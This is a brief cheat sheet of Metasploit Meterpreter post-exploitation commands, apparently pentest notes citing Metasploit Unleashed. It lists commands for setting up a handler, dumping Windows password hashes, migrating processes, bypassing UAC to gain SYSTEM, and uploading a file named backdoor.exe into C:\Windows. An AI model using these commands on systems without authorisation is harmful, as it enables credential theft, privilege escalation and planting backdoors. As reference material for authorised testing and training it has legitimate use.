# Common Meterpreter Commands

https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/


## Multi handler:

```
use exploit/multi/handler
```

## Reopen session:

```
session -i #
```

## Get hashes:

```
run post/windows/gather/hashdump
```

## migrate:

```
run post/windows/manage/migrate
```

or

```
use post/windows/manage/archmigrate
```

## Bypass UAC:

Use with an already achieved meterpreter shell:

- `use exploit/windows/local/bypassuac`
- `set SESSION <#>`
- `exploit`

This can be used to enable the `getsystem` command to work (potentially).

## Upload and download files:

`meterpreter > download Logs.log /root/`
`meterpreter > upload /root/backdoor.exe C:\\Windows`